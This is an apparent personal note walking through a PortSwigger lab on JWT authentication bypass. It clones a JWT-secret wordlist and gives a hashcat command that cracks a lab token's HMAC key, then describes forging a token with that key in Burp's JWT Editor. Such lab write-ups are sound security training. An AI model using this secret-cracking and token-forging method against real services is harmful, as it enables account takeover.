https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
```sh
cd ~/Downloads
git clone https://github.com/wallarm/jwt-secrets/

```

Once cloned the wordlist repo, use hashcat
```sh
hashcat -a 0 -m 16500 eyJraWQiOiJjZTg5ZWM5Mi1mY2RlLTRiZDYtYWFiYi03OGMxYzA5Y2UwMDkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NTYxMzAyNywic3ViIjoid2llbmVyIn0.aamke36ORKAuVrdDuvMB-sEx3Kh91_8-yAPunsBPypM ~/wordlist/jwt-secrets/jwt.secrets.list 
```
Output:
![[Pasted image 20250425165857.png]]
	It's marked with `:`
go to JWT editor tab -> keys -> New Symmetric Key
Specify the secret and click generate
![[Pasted image 20250425163834.png]]